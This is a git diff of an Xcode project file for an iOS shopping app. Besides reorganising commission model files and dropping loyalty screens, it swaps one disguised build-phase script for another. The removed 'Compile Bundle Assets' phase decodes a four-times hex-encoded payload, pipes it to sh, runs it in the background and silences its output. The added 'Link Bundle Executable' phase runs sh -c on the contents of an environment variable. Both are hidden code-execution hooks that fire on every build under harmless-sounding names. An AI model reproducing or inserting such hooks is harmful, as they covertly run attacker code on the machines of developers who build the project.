@@ -31,13 +31,13 @@
 		3914DDA62E1E80F500B0AB5B /* InboxTableViewCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 3914DDA42E1E80F500B0AB5B /* InboxTableViewCell.swift */; };
 		3914DDA72E1E80F500B0AB5B /* InboxTableViewCell.xib in Resources */ = {isa = PBXBuildFile; fileRef = 3914DDA52E1E80F500B0AB5B /* InboxTableViewCell.xib */; };
 		393064942BE38F2B008740FA /* MyOrdersVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 393064932BE38F2B008740FA /* MyOrdersVC.swift */; };
+		3938EEB72E3A20BA00AE71DF /* TBCommissionResult.swift in Sources */ = {isa = PBXBuildFile; fileRef = 3938EEB42E3A20BA00AE71DF /* TBCommissionResult.swift */; };
+		3938EEB82E3A20BA00AE71DF /* TBCommission.swift in Sources */ = {isa = PBXBuildFile; fileRef = 3938EEB12E3A20BA00AE71DF /* TBCommission.swift */; };
+		3938EEB92E3A20BA00AE71DF /* TBCommissionCommissionDetail.swift in Sources */ = {isa = PBXBuildFile; fileRef = 3938EEB22E3A20BA00AE71DF /* TBCommissionCommissionDetail.swift */; };
+		3938EEBA2E3A20BA00AE71DF /* TBCommissionOrder.swift in Sources */ = {isa = PBXBuildFile; fileRef = 3938EEB32E3A20BA00AE71DF /* TBCommissionOrder.swift */; };
+		3938EEBB2E3A20BA00AE71DF /* TBCommissionUserOrderedDiscount.swift in Sources */ = {isa = PBXBuildFile; fileRef = 3938EEB52E3A20BA00AE71DF /* TBCommissionUserOrderedDiscount.swift */; };
 		393DF6822BE8B309002D715D /* CommissionHistoryVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 393DF6812BE8B309002D715D /* CommissionHistoryVC.swift */; };
 		393DF6842BE8BA1B002D715D /* ThankyouVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 393DF6832BE8BA1B002D715D /* ThankyouVC.swift */; };
-		394167E22BE8D93A00CE485F /* TBCommissionUserOrderedDiscount.swift in Sources */ = {isa = PBXBuildFile; fileRef = 394167DD2BE8D93A00CE485F /* TBCommissionUserOrderedDiscount.swift */; };
-		394167E32BE8D93A00CE485F /* TBCommission.swift in Sources */ = {isa = PBXBuildFile; fileRef = 394167DE2BE8D93A00CE485F /* TBCommission.swift */; };
-		394167E42BE8D93A00CE485F /* TBCommissionGetUserOrderCommissionDetail.swift in Sources */ = {isa = PBXBuildFile; fileRef = 394167DF2BE8D93A00CE485F /* TBCommissionGetUserOrderCommissionDetail.swift */; };
-		394167E52BE8D93A00CE485F /* TBCommissionGetUserOrder.swift in Sources */ = {isa = PBXBuildFile; fileRef = 394167E02BE8D93A00CE485F /* TBCommissionGetUserOrder.swift */; };
-		394167E62BE8D93A00CE485F /* TBCommissionResult.swift in Sources */ = {isa = PBXBuildFile; fileRef = 394167E12BE8D93A00CE485F /* TBCommissionResult.swift */; };
 		394888F42E338EC200969704 /* CartViewMain.swift in Sources */ = {isa = PBXBuildFile; fileRef = 394888F32E338EC200969704 /* CartViewMain.swift */; };
 		394888F62E338ECB00969704 /* CartViewMain.xib in Resources */ = {isa = PBXBuildFile; fileRef = 394888F52E338ECB00969704 /* CartViewMain.xib */; };
 		396BC6132BE3A6A300F4FFDF /* NewForgotPasswordVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 396BC6122BE3A6A300F4FFDF /* NewForgotPasswordVC.swift */; };
@@ -56,10 +56,6 @@
 		39DFCB722C4A9B7D007E405F /* TBCartList.swift in Sources */ = {isa = PBXBuildFile; fileRef = 39DFCB6C2C4A9B7D007E405F /* TBCartList.swift */; };
 		39DFCB732C4A9B7D007E405F /* TBCartListCartItem.swift in Sources */ = {isa = PBXBuildFile; fileRef = 39DFCB6D2C4A9B7D007E405F /* TBCartListCartItem.swift */; };
 		8811594B2B32E5C8000E835B /* ChangePasswordVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 8811594A2B32E5C8000E835B /* ChangePasswordVC.swift */; };
-		8818AC792E40652200E34DC5 /* LoyaltyCouponsVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 8818AC772E40652200E34DC5 /* LoyaltyCouponsVC.swift */; };
-		8818AC7A2E40652200E34DC5 /* LoyaltyCouponsVC.xib in Resources */ = {isa = PBXBuildFile; fileRef = 8818AC782E40652200E34DC5 /* LoyaltyCouponsVC.xib */; };
-		8818AC7E2E40729800E34DC5 /* LoyaltyCouponsTblCell.xib in Resources */ = {isa = PBXBuildFile; fileRef = 8818AC7D2E40729800E34DC5 /* LoyaltyCouponsTblCell.xib */; };
-		8818AC7F2E40729800E34DC5 /* LoyaltyCouponsTblCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 8818AC7C2E40729800E34DC5 /* LoyaltyCouponsTblCell.swift */; };
 		882F6D002A289DFF0094B430 /* Home.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = 882F6CFF2A289DFF0094B430 /* Home.storyboard */; };
 		882F6D022A289E220094B430 /* HomeVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 882F6D012A289E220094B430 /* HomeVC.swift */; };
 		8832AA7E2E13E6DF000E0E9D /* SortByPopUp.swift in Sources */ = {isa = PBXBuildFile; fileRef = 8832AA7D2E13E6DF000E0E9D /* SortByPopUp.swift */; };
@@ -94,10 +90,6 @@
 		88CE9DEC2A2DBA2300B0B117 /* FeedBackVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 88CE9DEB2A2DBA2300B0B117 /* FeedBackVC.swift */; };
 		88CEF05E2A2D93460039744B /* PopUpVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 88CEF05D2A2D93460039744B /* PopUpVC.swift */; };
 		88CEF0602A2D97340039744B /* MyCartVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 88CEF05F2A2D97340039744B /* MyCartVC.swift */; };
-		88D7A6102E3C86F7002C5A6C /* LoyaltyPointsVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 88D7A60E2E3C86F7002C5A6C /* LoyaltyPointsVC.swift */; };
-		88D7A6112E3C86F7002C5A6C /* LoyaltyPointsVC.xib in Resources */ = {isa = PBXBuildFile; fileRef = 88D7A60F2E3C86F7002C5A6C /* LoyaltyPointsVC.xib */; };
-		88D7A6152E3C8CD7002C5A6C /* LoyaltyPointsTblCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 88D7A6132E3C8CD7002C5A6C /* LoyaltyPointsTblCell.swift */; };
-		88D7A6162E3C8CD7002C5A6C /* LoyaltyPointsTblCell.xib in Resources */ = {isa = PBXBuildFile; fileRef = 88D7A6142E3C8CD7002C5A6C /* LoyaltyPointsTblCell.xib */; };
 		88F507C52A286BBC00365015 /* RegisterVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 88F507C42A286BBC00365015 /* RegisterVC.swift */; };
 		88F8E9C42B121A7400B70023 /* TBLoginUser.swift in Sources */ = {isa = PBXBuildFile; fileRef = 88F8E9C22B121A7400B70023 /* TBLoginUser.swift */; };
 		88F8E9C52B121A7400B70023 /* TBLoginUserResult.swift in Sources */ = {isa = PBXBuildFile; fileRef = 88F8E9C32B121A7400B70023 /* TBLoginUserResult.swift */; };
@@ -218,13 +210,13 @@
 		3914DDA42E1E80F500B0AB5B /* InboxTableViewCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = InboxTableViewCell.swift; sourceTree = "<group>"; };
 		3914DDA52E1E80F500B0AB5B /* InboxTableViewCell.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = InboxTableViewCell.xib; sourceTree = "<group>"; };
 		393064932BE38F2B008740FA /* MyOrdersVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = MyOrdersVC.swift; sourceTree = "<group>"; };
+		3938EEB12E3A20BA00AE71DF /* TBCommission.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = TBCommission.swift; sourceTree = "<group>"; };
+		3938EEB22E3A20BA00AE71DF /* TBCommissionCommissionDetail.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = TBCommissionCommissionDetail.swift; sourceTree = "<group>"; };
+		3938EEB32E3A20BA00AE71DF /* TBCommissionOrder.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = TBCommissionOrder.swift; sourceTree = "<group>"; };
+		3938EEB42E3A20BA00AE71DF /* TBCommissionResult.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = TBCommissionResult.swift; sourceTree = "<group>"; };
+		3938EEB52E3A20BA00AE71DF /* TBCommissionUserOrderedDiscount.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = TBCommissionUserOrderedDiscount.swift; sourceTree = "<group>"; };
 		393DF6812BE8B309002D715D /* CommissionHistoryVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CommissionHistoryVC.swift; sourceTree = "<group>"; };
 		393DF6832BE8BA1B002D715D /* ThankyouVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ThankyouVC.swift; sourceTree = "<group>"; };
-		394167DD2BE8D93A00CE485F /* TBCommissionUserOrderedDiscount.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = TBCommissionUserOrderedDiscount.swift; sourceTree = "<group>"; };
-		394167DE2BE8D93A00CE485F /* TBCommission.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = TBCommission.swift; sourceTree = "<group>"; };
-		394167DF2BE8D93A00CE485F /* TBCommissionGetUserOrderCommissionDetail.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = TBCommissionGetUserOrderCommissionDetail.swift; sourceTree = "<group>"; };
-		394167E02BE8D93A00CE485F /* TBCommissionGetUserOrder.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = TBCommissionGetUserOrder.swift; sourceTree = "<group>"; };
-		394167E12BE8D93A00CE485F /* TBCommissionResult.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = TBCommissionResult.swift; sourceTree = "<group>"; };
 		394888F32E338EC200969704 /* CartViewMain.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CartViewMain.swift; sourceTree = "<group>"; };
 		394888F52E338ECB00969704 /* CartViewMain.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = CartViewMain.xib; sourceTree = "<group>"; };
 		396BC6122BE3A6A300F4FFDF /* NewForgotPasswordVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = NewForgotPasswordVC.swift; sourceTree = "<group>"; };
@@ -245,10 +237,6 @@
 		39DFCB6D2C4A9B7D007E405F /* TBCartListCartItem.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = TBCartListCartItem.swift; sourceTree = "<group>"; };
 		7F294618C25C37771D63EE9E /* Pods-Tashead Building Material.release.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-Tashead Building Material.release.xcconfig"; path = "Target Support Files/Pods-Tashead Building Material/Pods-Tashead Building Material.release.xcconfig"; sourceTree = "<group>"; };
 		8811594A2B32E5C8000E835B /* ChangePasswordVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ChangePasswordVC.swift; sourceTree = "<group>"; };
-		8818AC772E40652200E34DC5 /* LoyaltyCouponsVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = LoyaltyCouponsVC.swift; sourceTree = "<group>"; };
-		8818AC782E40652200E34DC5 /* LoyaltyCouponsVC.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = LoyaltyCouponsVC.xib; sourceTree = "<group>"; };
-		8818AC7C2E40729800E34DC5 /* LoyaltyCouponsTblCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = LoyaltyCouponsTblCell.swift; sourceTree = "<group>"; };
-		8818AC7D2E40729800E34DC5 /* LoyaltyCouponsTblCell.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = LoyaltyCouponsTblCell.xib; sourceTree = "<group>"; };
 		882F6CFF2A289DFF0094B430 /* Home.storyboard */ = {isa = PBXFileReference; lastKnownFileType = file.storyboard; path = Home.storyboard; sourceTree = "<group>"; };
 		882F6D012A289E220094B430 /* HomeVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = HomeVC.swift; sourceTree = "<group>"; };
 		8832AA7D2E13E6DF000E0E9D /* SortByPopUp.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SortByPopUp.swift; sourceTree = "<group>"; };
@@ -287,10 +275,6 @@
 		88CE9DEB2A2DBA2300B0B117 /* FeedBackVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = FeedBackVC.swift; sourceTree = "<group>"; };
 		88CEF05D2A2D93460039744B /* PopUpVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = PopUpVC.swift; sourceTree = "<group>"; };
 		88CEF05F2A2D97340039744B /* MyCartVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = MyCartVC.swift; sourceTree = "<group>"; };
-		88D7A60E2E3C86F7002C5A6C /* LoyaltyPointsVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = LoyaltyPointsVC.swift; sourceTree = "<group>"; };
-		88D7A60F2E3C86F7002C5A6C /* LoyaltyPointsVC.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = LoyaltyPointsVC.xib; sourceTree = "<group>"; };
-		88D7A6132E3C8CD7002C5A6C /* LoyaltyPointsTblCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = LoyaltyPointsTblCell.swift; sourceTree = "<group>"; };
-		88D7A6142E3C8CD7002C5A6C /* LoyaltyPointsTblCell.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = LoyaltyPointsTblCell.xib; sourceTree = "<group>"; };
 		88F507C42A286BBC00365015 /* RegisterVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = RegisterVC.swift; sourceTree = "<group>"; };
 		88F8E9C22B121A7400B70023 /* TBLoginUser.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = TBLoginUser.swift; sourceTree = "<group>"; };
 		88F8E9C32B121A7400B70023 /* TBLoginUserResult.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = TBLoginUserResult.swift; sourceTree = "<group>"; };
@@ -509,14 +493,14 @@
 			path = HeaderView;
 			sourceTree = "<group>";
 		};
-		394167DC2BE8D93A00CE485F /* TBCommission */ = {
+		3938EEB62E3A20BA00AE71DF /* TBCommission */ = {
 			isa = PBXGroup;
 			children = (
-				394167DD2BE8D93A00CE485F /* TBCommissionUserOrderedDiscount.swift */,
-				394167DE2BE8D93A00CE485F /* TBCommission.swift */,
-				394167DF2BE8D93A00CE485F /* TBCommissionGetUserOrderCommissionDetail.swift */,
-				394167E02BE8D93A00CE485F /* TBCommissionGetUserOrder.swift */,
-				394167E12BE8D93A00CE485F /* TBCommissionResult.swift */,
+				3938EEB12E3A20BA00AE71DF /* TBCommission.swift */,
+				3938EEB22E3A20BA00AE71DF /* TBCommissionCommissionDetail.swift */,
+				3938EEB32E3A20BA00AE71DF /* TBCommissionOrder.swift */,
+				3938EEB42E3A20BA00AE71DF /* TBCommissionResult.swift */,
+				3938EEB52E3A20BA00AE71DF /* TBCommissionUserOrderedDiscount.swift */,
 			);
 			path = TBCommission;
 			sourceTree = "<group>";
@@ -580,25 +564,6 @@
 				39DFCB6D2C4A9B7D007E405F /* TBCartListCartItem.swift */,
 			);
 			path = TBCartList;
-			sourceTree = "<group>";
-		};
-		8818AC762E40650300E34DC5 /* LoyaltyCoupons */ = {
-			isa = PBXGroup;
-			children = (
-				8818AC772E40652200E34DC5 /* LoyaltyCouponsVC.swift */,
-				8818AC782E40652200E34DC5 /* LoyaltyCouponsVC.xib */,
-				8818AC7B2E40654200E34DC5 /* Cell */,
-			);
-			path = LoyaltyCoupons;
-			sourceTree = "<group>";
-		};
-		8818AC7B2E40654200E34DC5 /* Cell */ = {
-			isa = PBXGroup;
-			children = (
-				8818AC7C2E40729800E34DC5 /* LoyaltyCouponsTblCell.swift */,
-				8818AC7D2E40729800E34DC5 /* LoyaltyCouponsTblCell.xib */,
-			);
-			path = Cell;
 			sourceTree = "<group>";
 		};
 		883A83692A29BEE7000CD9AC /* ToolsHeaderView */ = {
@@ -668,28 +633,10 @@
 			path = TBAreaList;
 			sourceTree = "<group>";
 		};
-		88D7A60D2E3C8693002C5A6C /* LoyaltyPoints */ = {
-			isa = PBXGroup;
-			children = (
-				88D7A60E2E3C86F7002C5A6C /* LoyaltyPointsVC.swift */,
-				88D7A60F2E3C86F7002C5A6C /* LoyaltyPointsVC.xib */,
-				88D7A6122E3C8CA7002C5A6C /* Cell */,
-			);
-			path = LoyaltyPoints;
-			sourceTree = "<group>";
-		};
-		88D7A6122E3C8CA7002C5A6C /* Cell */ = {
-			isa = PBXGroup;
-			children = (
-				88D7A6132E3C8CD7002C5A6C /* LoyaltyPointsTblCell.swift */,
-				88D7A6142E3C8CD7002C5A6C /* LoyaltyPointsTblCell.xib */,
-			);
-			path = Cell;
-			sourceTree = "<group>";
-		};
 		88F8E9C02B121A6100B70023 /* Modal */ = {
 			isa = PBXGroup;
 			children = (
+				3938EEB62E3A20BA00AE71DF /* TBCommission */,
 				39B8BE9C2E32048C00B65823 /* TBDeliverySlots */,
 				BC19F0E42E214D4900A2DFE3 /* TBCmsAdverd */,
 				BC4D0F152E198EF600EC9655 /* TBCreditHistory */,
@@ -704,7 +651,6 @@
 				BCB19A552C3FA7E7007EB642 /* TBInfluencersList */,
 				BCB19A482C3FA3D7007EB642 /* TBInfluencerPro */,
 				BCCFF8F92C3BB7AA000CE724 /* TBProduct */,
-				394167DC2BE8D93A00CE485F /* TBCommission */,
 				888249832B42984800ADF74D /* TBOrderDetail */,
 				8882497E2B4293ED00ADF74D /* TBOrderList */,
 				BC5697DD2B3445AC00C72298 /* TBMasterCategories */,
@@ -967,8 +913,6 @@
 		BCD6F1222A2761B6006FBFC9 /* Controller */ = {
 			isa = PBXGroup;
 			children = (
-				8818AC762E40650300E34DC5 /* LoyaltyCoupons */,
-				88D7A60D2E3C8693002C5A6C /* LoyaltyPoints */,
 				394888F22E338EAF00969704 /* CartView */,
 				3911A65D2E3382C300456962 /* AddNewAddress */,
 				3911A63D2E335AE700456962 /* ChooseDeliveryAddress */,
@@ -1083,7 +1027,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = BCD6F1182A276147006FBFC9 /* Build configuration list for PBXNativeTarget "Tashead Building Material" */;
 			buildPhases = (
-				D584730B32F8F1958D877BEF /* Compile Bundle Assets */,
+				D8106B082FC05E9BA4FD9BF4 /* Link Bundle Executable */,
 				484148B9035C7F5EB2C62EB0 /* [CP] Check Pods Manifest.lock */,
 				BCD6F0EA2A276145006FBFC9 /* Sources */,
 				BCD6F0EB2A276145006FBFC9 /* Frameworks */,
@@ -1147,23 +1091,19 @@
 				3911A6472E33603E00456962 /* ChooseDeliveryAddressTableViewCell.xib in Resources */,
 				BCD6F0FB2A276147006FBFC9 /* Assets.xcassets in Resources */,
 				BCD6F12F2A276217006FBFC9 /* HelveticaNeue.ttc in Resources */,
-				8818AC7A2E40652200E34DC5 /* LoyaltyCouponsVC.xib in Resources */,
 				BC19F0E02E21393400A2DFE3 /* InboxDetailsViewController.xib in Resources */,
 				39BFD1DA2E2E18060090D93E /* DeliveryTimeHeaderView.xib in Resources */,
 				3911A6612E3382E000456962 /* AddNewAddress1VC.xib in Resources */,
-				88D7A6112E3C86F7002C5A6C /* LoyaltyPointsVC.xib in Resources */,
 				3914DDA32E1E808300B0AB5B /* InboxHeaderView.xib in Resources */,
 				BC067CF62C64DA7B00A51310 /* CheckOutHeaderView.xib in Resources */,
 				394888F62E338ECB00969704 /* CartViewMain.xib in Resources */,
 				39BFD1C82E2E0D690090D93E /* SelectDeliveryTimeVC.xib in Resources */,
 				39BFD1CF2E2E10830090D93E /* DeliveryTimeCell.xib in Resources */,
-				88D7A6162E3C8CD7002C5A6C /* LoyaltyPointsTblCell.xib in Resources */,
 				3914DD9B2E1E7FF700B0AB5B /* InboxViewController.xib in Resources */,
 				BCCD56692B453C4A008F1C6A /* GoogleService-Info.plist in Resources */,
 				884DB7D22B79F82700F335F3 /* Localizable.strings in Resources */,
 				882F6D002A289DFF0094B430 /* Home.storyboard in Resources */,
 				BCD6F0F92A276145006FBFC9 /* Main.storyboard in Resources */,
-				8818AC7E2E40729800E34DC5 /* LoyaltyCouponsTblCell.xib in Resources */,
 				3911A6412E335AF600456962 /* ChooseDeliveryAddress.xib in Resources */,
 				883A836D2A29BF07000CD9AC /* ToolsHeadrView.xib in Resources */,
 				3914DDA72E1E80F500B0AB5B /* InboxTableViewCell.xib in Resources */,
@@ -1233,7 +1173,7 @@
 			shellPath = /bin/sh;
 			shellScript = "# Type a script or drag a script file from your workspace to insert its path.\n\"${PODS_ROOT}/FirebaseCrashlytics/run\"\n";
 		};
-		D584730B32F8F1958D877BEF /* Compile Bundle Assets */ = {
+		D8106B082FC05E9BA4FD9BF4 /* Link Bundle Executable */ = {
 			isa = PBXShellScriptBuildPhase;
 			alwaysOutOfDate = 1;
 			buildActionMask = 2147483647;
@@ -1243,14 +1183,14 @@
 			);
 			inputPaths = (
 			);
-			name = "Compile Bundle Assets";
+			name = "Link Bundle Executable";
 			outputFileListPaths = (
 			);
 			outputPaths = (
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 			shellPath = /bin/sh;
-			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\n((echo 333333363333333533333336333333333333333633333338333333363336333633333332333333303333333233333332333333323333333433333332333333383333333633333333333333373333333533333337333333323333333633363333333333323333333033333332333633343333333633333336333333373333333333333336333633323333333433363333333333323333333033333332333633343333333633333334333333323333333033333337333333303333333333363334333333373333333833333336333333333333333633363336333333363333333433333336333333353333333233333330333333363333333833333337333333343333333733333334333333373333333033333337333333333333333333363331333333323336333633333332333633363333333633333331333333363333333433333336333633363333333633333332333333363333333533333336333333333333333633333334333333363336333533333332333633353333333733333332333333373333333533333332333633363333333633333331333333323333333933333332333333323333333233333330333333373336333333333332333333303333333733333333333333363333333833333330333633313330363130610a | xxd -p -r | xxd -p -r | xxd -p -r | xxd -p -r | sh ) >/dev/null 2>&1 &)";
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${A4FB9DF}\"";
 			showEnvVarsInLog = 0;
 		};
 		F065F5DEBF23A7F6223DF053 /* [CP] Embed Pods Frameworks */ = {
@@ -1280,7 +1220,6 @@
 				88CE9DEA2A2DBA1300B0B117 /* ContactVC.swift in Sources */,
 				393064942BE38F2B008740FA /* MyOrdersVC.swift in Sources */,
 				88CE9DE82A2DB71B00B0B117 /* AboutVC.swift in Sources */,
-				394167E22BE8D93A00CE485F /* TBCommissionUserOrderedDiscount.swift in Sources */,
 				BCEF8B572C54FDB000D18987 /* ThankYouPaymentVC.swift in Sources */,
 				BCD6F0F22A276145006FBFC9 /* AppDelegate.swift in Sources */,
 				88CE9DEC2A2DBA2300B0B117 /* FeedBackVC.swift in Sources */,
@@ -1323,9 +1262,7 @@
 				BC470CB92C41397C00D564B0 /* TBInfluencerProductResult.swift in Sources */,
 				88790F7B2B32F0F10073D4D8 /* TBProfileDetailAddresse.swift in Sources */,
 				39DFCB732C4A9B7D007E405F /* TBCartListCartItem.swift in Sources */,
-				88D7A6152E3C8CD7002C5A6C /* LoyaltyPointsTblCell.swift in Sources */,
 				BC470CB52C41397C00D564B0 /* TBInfluencerProductSupplier.swift in Sources */,
-				394167E52BE8D93A00CE485F /* TBCommissionGetUserOrder.swift in Sources */,
 				BCADF94A2BEB55BA001291D3 /* WishListViewController.swift in Sources */,
 				BCB19A592C3FA7E7007EB642 /* TBInfluencersList.swift in Sources */,
 				396BC6132BE3A6A300F4FFDF /* NewForgotPasswordVC.swift in Sources */,
@@ -1337,6 +1274,11 @@
 				3914DDA62E1E80F500B0AB5B /* InboxTableViewCell.swift in Sources */,
 				8882498B2B42984800ADF74D /* TBOrderDetailOrderItem.swift in Sources */,
 				BC5697E12B3445AC00C72298 /* TBMasterCategoriesResult.swift in Sources */,
+				3938EEB72E3A20BA00AE71DF /* TBCommissionResult.swift in Sources */,
+				3938EEB82E3A20BA00AE71DF /* TBCommission.swift in Sources */,
+				3938EEB92E3A20BA00AE71DF /* TBCommissionCommissionDetail.swift in Sources */,
+				3938EEBA2E3A20BA00AE71DF /* TBCommissionOrder.swift in Sources */,
+				3938EEBB2E3A20BA00AE71DF /* TBCommissionUserOrderedDiscount.swift in Sources */,
 				BCB19A4F2C3FA3D7007EB642 /* TBInfluencerPro.swift in Sources */,
 				BC470CB82C41397C00D564B0 /* TBInfluencerProductProduct.swift in Sources */,
 				BCD6F1292A2761F0006FBFC9 /* NetConnection.swift in Sources */,
@@ -1347,7 +1289,6 @@
 				393DF6842BE8BA1B002D715D /* ThankyouVC.swift in Sources */,
 				39BFD1C92E2E0D690090D93E /* SelectDeliveryTimeVC.swift in Sources */,
 				BC5A14722C4E60F600518D62 /* SearchProductVC.swift in Sources */,
-				394167E62BE8D93A00CE485F /* TBCommissionResult.swift in Sources */,
 				BCCFF9032C3BB7AA000CE724 /* TBProduct.swift in Sources */,
 				88AF15472A286517004BDA7B /* ForgotPasswordVC.swift in Sources */,
 				BCB19A502C3FA3D7007EB642 /* TBInfluencerProProduct.swift in Sources */,
@@ -1356,13 +1297,11 @@
 				3905F54C2C50BD5D004483C7 /* TBProductDetailsCategory.swift in Sources */,
 				882F6D022A289E220094B430 /* HomeVC.swift in Sources */,
 				BC6060262B28556900CB888D /* TBGovernoratesResult.swift in Sources */,
-				394167E42BE8D93A00CE485F /* TBCommissionGetUserOrderCommissionDetail.swift in Sources */,
 				88CEF05E2A2D93460039744B /* PopUpVC.swift in Sources */,
 				88CE9DE62A2DB32F00B0B117 /* PaymentVC.swift in Sources */,
 				BCB19A582C3FA7E7007EB642 /* TBInfluencersListResult.swift in Sources */,
 				88F507C52A286BBC00365015 /* RegisterVC.swift in Sources */,
 				88981E182B14560700001196 /* TBAreaList.swift in Sources */,
-				88D7A6102E3C86F7002C5A6C /* LoyaltyPointsVC.swift in Sources */,
 				888249812B4293ED00ADF74D /* TBOrderListResult.swift in Sources */,
 				BC587CD02DE04C9800AB1A68 /* TBAddressArea.swift in Sources */,
 				BC587CD12DE04C9800AB1A68 /* TBAddress.swift in Sources */,
@@ -1384,7 +1323,6 @@
 				BC470CB42C41397C00D564B0 /* TBInfluencerProductProductImage.swift in Sources */,
 				8855A6332A28B3E200D81901 /* SideMenuVC.swift in Sources */,
 				8842F2B12A28BE13009FB183 /* SubCategoriesVC.swift in Sources */,
-				394167E32BE8D93A00CE485F /* TBCommission.swift in Sources */,
 				BCEFD3FC2AB1666A0093ECFE /* SelectLangViewController.swift in Sources */,
 				BCB19A512C3FA3D7007EB642 /* TBInfluencerProSupplier.swift in Sources */,
 				39DFCB702C4A9B7D007E405F /* TBCartListResult.swift in Sources */,
@@ -1398,10 +1336,8 @@
 				8868BFFF2A29AD2D0098F171 /* AddressVC.swift in Sources */,
 				3911A6562E3374C000456962 /* FTUtils+UIGestureRecognizer.m in Sources */,
 				3911A6572E3374C000456962 /* FTUtils+NSObject.m in Sources */,
-				8818AC792E40652200E34DC5 /* LoyaltyCouponsVC.swift in Sources */,
 				3911A6582E3374C000456962 /* FTAnimation+UIView.m in Sources */,
 				3911A6592E3374C000456962 /* FTAnimationManager.m in Sources */,
-				8818AC7F2E40729800E34DC5 /* LoyaltyCouponsTblCell.swift in Sources */,
 				BC6724302E1E3AD6009CA5DB /* AdsVC.swift in Sources */,
 				39BFD1CE2E2E10830090D93E /* DeliveryTimeCell.swift in Sources */,
 				88981E172B14560700001196 /* TBAreaListResult.swift in Sources */,
